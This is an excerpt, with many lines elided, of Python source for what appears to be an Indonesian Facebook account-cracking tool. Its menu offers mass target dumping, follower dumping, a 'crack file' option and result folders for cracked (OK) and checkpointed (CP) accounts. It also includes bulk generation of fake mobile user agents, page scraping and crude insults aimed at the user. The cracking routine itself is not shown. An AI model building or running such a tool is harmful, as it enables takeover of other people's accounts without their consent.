...
for xd in range(10000):
	...
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/101.0.4951.54'
	...
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (Linux; Android 10; SM-A205U)'
	...
	i='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/114.0.5735.130'
...
\t|_______/[___]   \'-;__/[_____][_____]'.__.'[___]    	
			{m}•{k}•{h}•{sir} Author : GreynoooXD {x}{m}•{k}•{h}•{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
		...
		try:
			...
			li = 'JARINGAN LU JELEK / KUOTA LU HABIS KONTOL'
...
def menu(id):
	...
	print('>> 5. Hasil Crack  ')
	print('>> 0. Keluar       ')
	_____greyno__xd_____ = input('\n>> Pilih : ')
	if _____greyno__xd_____ in ['1']:
		dump_massal()
	elif _____greyno__xd_____ in ['2']:
		dump_follower()
	elif _____greyno__xd_____ in ['3']:
		error()
	elif _____greyno__xd_____ in ['4']:
		crack_file()
	elif _____greyno__xd_____ in ['5']:
		result()
	elif _____greyno__xd_____ in ['0']:
...
def result():
	...
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
			...
			print('>> File Tidak Di Temukan, Mohon Coli Dulu ')
			time.sleep(3)
			back()
		if len(vin)==0:
			...
			try:geh = lol[geeh]
				...
				print('>> Cuma Disuruh Pilih Ajah Susah Tai Laso ')
				exit()
		...
		try:vin = os.listdir('OK')
			...
			back()
		if len(vin)==0:
			print('>> Anda Tidak Mempunyai File OK, Mohon Coli Dulu ')
			time.sleep(2)
			back()
		else:
			cih = 0
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('>> Mau Berapa Target Laso ? : '))
	except ValueError:
		print('>> Masukkan Angka Tai Laso, Bukan Huruf Tau Membaca Gak Sih? ')
		exit()
	if jum<1 or jum>100:
...
def grup():
	...
	ses = requests.Session()
	try:
		gn = parser(ses.get(url, headers=bermodalbro).text, 'html.parser')
	except requests.exceptions.ConnectionError:
		print(balmond+m+" Koneksi Internet Terbelah Dua Puluh Juta Bagian..")
		time.sleep(0.5)
		exit()
	berr = gn.find("title")
